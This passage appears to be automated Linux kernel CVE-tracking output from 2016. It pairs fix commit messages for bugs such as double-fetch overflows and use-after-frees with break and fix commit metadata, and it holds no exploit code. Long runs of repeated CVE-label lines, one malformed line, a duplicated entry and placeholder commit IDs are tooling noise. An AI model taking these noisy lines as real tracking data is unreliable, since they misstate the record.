     [<ffffffffa05660ce>] srpt_process_completion+0xde/0x570 [ib_srpt]
     [<ffffffffa056669f>] srpt_compl_thread+0x13f/0x160 [ib_srpt]
     [<ffffffff8109726f>] kthread+0xcf/0xe0
     [<ffffffff81613cfc>] ret_from_fork+0x7c/0xb0
    
    Signed-off-by: Bart Van Assche <bart.vanassche@sandisk.com>
    Fixes: 3e4f574857ee ("ib_srpt: Convert TMR path to target_submit_tmr")
    Tested-by: Alex Estrin <alex.estrin@intel.com>
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Cc: Nicholas Bellinger <nab@linux-iscsi.org>
    Cc: Sagi Grimberg <sagig@mellanox.com>
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Doug Ledford <dledford@redhat.com>

 drivers/infiniband/ulp/srpt/ib_srpt.c |   59 +--------------------------------
 1 file changed, 1 insertion(+), 58 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6327
Break Date: 2012-11-28
Break Commit: 3e4f574857eebce60bb56d7524f3f9eaa2a126d0
Break Tag: 3.8
Linus Fix Date: 2016-02-29
Linus Commit: 51093254bf879bc9ce96590400a87897c7498463
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
CVE-2016-6480:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.78.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Author: Dave Carroll <david.carroll@microsemi.com>
Date:   Fri Aug 5 13:44:10 2016 -0600

    aacraid: Check size values after double-fetch from user
    
    In aacraid's ioctl_send_fib() we do two fetches from userspace, one the
    get the fib header's size and one for the fib itself. Later we use the
    size field from the second fetch to further process the fib. If for some
    reason the size from the second fetch is different than from the first
    fix, we may encounter an out-of- bounds access in aac_fib_send(). We
    also check the sender size to insure it is not out of bounds. This was
    reported in https://bugzilla.kernel.org/show_bug.cgi?id=116751 and was
    assigned CVE-2016-6480.
    
    Reported-by: Pengfei Wang <wpengfeinudt@gmail.com>
    Fixes: 7c00ffa31 '[SCSI] 2.6 aacraid: Variable FIB size (updated patch)'
    Cc: stable@vger.kernel.org
    Signed-off-by: Dave Carroll <david.carroll@microsemi.com>
    Reviewed-by: Johannes Thumshirn <jthumshirn@suse.de>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/aacraid/commctrl.c |   13 +++++++++++--
 1 file changed, 11 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6480
Break Date: 2005-05-20
Break Commit: 7c00ffa314bf0fb0e23858bbebad33b48b6abbb9
Break Tag: 2.6
Linus Fix Date: 2016-08-08
Linus Commit: fa00c437eef8dc2e7b25f8cd868cfa405fcc2bb3
Linus Tag: 4.8
Stable Date: 2016-09-07
Stable Commit: 67d4aa44188d0da7f661972a88f9ac448e4fd2fe
Stable Tag: 3.14.78

CVE-2016-6516:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
CVE-2016-6516:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 10eec60ce79187686e052092e5383c99b4420a20
Author: Scott Bauer <sbauer@plzdonthack.me>
Date:   Wed Jul 27 19:11:29 2016 -0600

    vfs: ioctl: prevent double-fetch in dedupe ioctl
    
    This prevents a double-fetch from user space that can lead to to an
    undersized allocation and heap overflow.
    
    Fixes: 54dbc1517237 ("vfs: hoist the btrfs deduplication ioctl to the vfs")
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 fs/ioctl.c |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6516
Break Date: 2016-01-01
Break Commit: 54dbc15172375641ef03399e8f911d7165eb90fb
Break Tag: 4.5
Linus Fix Date: 2016-07-28
Linus Commit: 10eec60ce79187686e052092e5383c99b4420a20
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
2.6:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
CVE-2016-6828:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit bb1fceca22492109be12640d49f5ea5a544c6bb4
Author: Eric Dumazet <edumazet@google.com>
Date:   Wed Aug 17 05:56:26 2016 -0700

    tcp: fix use after free in tcp_xmit_retransmit_queue()
    
    When tcp_sendmsg() allocates a fresh and empty skb, it puts it at the
    tail of the write queue using tcp_add_write_queue_tail()
    
    Then it attempts to copy user data into this fresh skb.
    
    If the copy fails, we undo the work and remove the fresh skb.
    
    Unfortunately, this undo lacks the change done to tp->highest_sack and
    we can leave a dangling pointer (to a freed skb)
    
    Later, tcp_xmit_retransmit_queue() can dereference this pointer and
    access freed memory. For regular kernels where memory is not unmapped,
    this might cause SACK bugs because tcp_highest_sack_seq() is buggy,
    returning garbage instead of tp->snd_nxt, but with various debug
    features like CONFIG_DEBUG_PAGEALLOC, this can crash the kernel.
    
    This bug was found by Marco Grassi thanks to syzkaller.
    
    Fixes: 6859d49475d4 ("[TCP]: Abstract tp->highest_sack accessing & point to next skb")
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Cc: Ilpo Jrvinen <ilpo.jarvinen@helsinki.fi>
    Cc: Yuchung Cheng <ycheng@google.com>
    Cc: Neal Cardwell <ncardwell@google.com>
    Acked-by: Neal Cardwell <ncardwell@google.com>
    Reviewed-by: Cong Wang <xiyou.wangcong@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/net/tcp.h |    2 ++
 1 file changed, 2 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-6828
Break Date: 2008-01-28
Break Commit: 6859d49475d4f32abe640372117e4b687906e6b6
Break Tag: 2.6
Linus Fix Date: 2016-08-18
Linus Commit: bb1fceca22492109be12640d49f5ea5a544c6bb4
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
CVE-2016-6197:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 11f3710417d026ea2f4fcf362d866342c5274185
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Mon Mar 21 17:31:44 2016 +0100

    ovl: verify upper dentry before unlink and rename
    
    Unlink and rename in overlayfs checked the upper dentry for staleness by
    verifying upper->d_parent against upperdir.  However the dentry can go
    stale also by being unhashed, for example.
    
    Expand the verification to actually look up the name again (under parent
    lock) and check if it matches the upper dentry.  This matches what the VFS
    does before passing the dentry to filesytem's unlink/rename methods, which
    excludes any inconsistency caused by overlayfs.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>

 fs/overlayfs/dir.c |   59 +++++++++++++++++++++++++++++++++-------------------
 1 file changed, 38 insertions(+), 21 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6197
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-21
Linus Commit: 11f3710417d026ea2f4fcf362d866342c5274185
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: add vfs_select_inode() helper
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/open.c              |   12 ++++--------
 include/linux/dcache.h |   12 ++++++++++++
 2 files changed, 16 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-05-10
Linus Commit: 54d5ca871e72f2bb172ec9323497f01cd5091ec7
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6198:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca
Author: Miklos Szeredi <mszeredi@redhat.com>
Date:   Wed May 11 01:16:37 2016 +0200

    vfs: rename: check backing inode being equal
    
    If a file is renamed to a hardlink of itself POSIX specifies that rename(2)
    should do nothing and return success.
    
    This condition is checked in vfs_rename().  However it won't detect hard
    links on overlayfs where these are given separate inodes on the overlayfs
    layer.
    
    Overlayfs itself detects this condition and returns success without doing
    anything, but then vfs_rename() will proceed as if this was a successful
    rename (detach_mounts(), d_move()).
    
    The correct thing to do is to detect this condition before even calling
    into overlayfs.  This patch does this by calling vfs_select_inode() to get
    the underlying inodes.
    
    Signed-off-by: Miklos Szeredi <mszeredi@redhat.com>
    Cc: <stable@vger.kernel.org> # v4.2+

 fs/namei.c |    6 +++++-
 1 file changed, 5 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-6198
Break Date: -
Break Commit: -
